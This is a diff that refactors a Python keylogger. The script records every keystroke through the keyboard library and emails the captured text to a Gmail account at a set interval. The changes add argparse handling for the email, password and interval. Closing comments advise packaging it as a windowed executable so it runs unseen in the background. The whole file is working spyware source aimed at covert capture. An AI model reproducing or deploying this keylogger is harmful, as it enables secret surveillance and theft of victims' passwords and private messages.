@@ -1,40 +1,10 @@
-# for sending mails
 import smtplib
 import sys
-
-try:
-    # get full control of keyboard
-    import keyboard
-except ModuleNotFoundError:
-    print("Error : Cannot import keyboard!")
-    print("If not installed :\n(run this command)\npip install keyboard")
-    sys.exit(1)
-
-
-# Semaphore to block and unblock the thread
+import argparse
+import keyboard
+# Semaphore to block the thread
 # Timer to run a method after a particular interval of time
 from threading import Semaphore, Timer
-
-# before running the script set "ACCESS TO LESS SECURE APPS" to YES in google account
-
-try:
-    # sys.argv[1] will take time in seconds as first CLA
-    # or we can replace sys.argv[1] with 60 for (1 minute)
-    TIME_INTERVAL = int(sys.argv[1].strip())
-    # sys.argv[2] will take email as second CLA
-    # or we can replace sys.argv[2] with "email"
-    EMAIL = sys.argv[2].strip()
-    # sys.argv[3] will take password as third CLA
-    # or we can replace sys.argv[3] with "password"
-    PASSWORD = sys.argv[3].strip()
-except (ValueError, IndexError, TypeError):
-    print("Usage :\npython3 keylogger.py \"time_interval_in_seconds\" \"gmail_email\" \"password\"")
-    sys.exit(1)
-
-
-if len(EMAIL) <= 0 or len(PASSWORD) <= 0:
-    print("Usage :\npython3 keylogger.py \"time_interval_in_seconds\" \"gmail_email\" \"password\"")
-    sys.exit(1)
 
 
 class Keylogger:
@@ -46,7 +16,7 @@ class Keylogger:
         # semaphore state
         self.semaphore = Semaphore(0)
 
-    def callback(self,event):
+    def callback(self, event):
         # this method is called on every keystroke
         name = event.name
         if len(name) > 1:
@@ -86,21 +56,39 @@ class Keylogger:
         Timer(interval=self.interval, function=self.report).start()
 
     def start(self):
+        print("Keylogging started...")
         keyboard.on_release(callback=self.callback)
         self.report()
         self.semaphore.acquire()
 
 
-keylogger = Keylogger(interval=TIME_INTERVAL)
-try:
-    keylogger.sendmail(EMAIL, PASSWORD)
-except smtplib.SMTPAuthenticationError:
-    print("Authentication Error!!!\n1. Internet may not be connected or is slow")
-    print("2. Email or Password is incorrect\n3. ACCESS TO LESS SECURE APPS is turned off")
-    sys.exit(1)
+if __name__ == "__main__":
+    global EMAIL
+    global PASSWORD
+    global TIME_INTERVAL
 
-keylogger.start()
+    # argument parser for command line arguments
+    parser = argparse.ArgumentParser(description="Keylogger (Keylogs to Gmail Account)")
+    parser.add_argument("email", help="email id of receiver")
+    parser.add_argument("password", help="password of receiver's id")
+    parser.add_argument("-t", "--time", type=int, dest="time", default="600", help="time interval (in sec) of mails, default=600")
+
+    args = parser.parse_args()
+    EMAIL, PASSWORD, TIME_INTERVAL = args.email, args.password, args.time
+
+    keylogger = Keylogger(interval=TIME_INTERVAL)
+
+    # try to login using credentials
+    try:
+        keylogger.sendmail(EMAIL, PASSWORD)
+    except:
+        print("Error!\n1. Slow or No Internet\n2. Incorrect Email or Password")
+        print("3. \"ACCESS TO LESS SECURE APPS\" is turned off in Gmail account")
+        sys.exit(1)
+
+    # start the main working
+    keylogger.start()
+
 
 # convert to window based exe with auto-py-to-exe
-# and pass email and password as command line argument
-# to exe file, so that it can run in background
+# and run in background
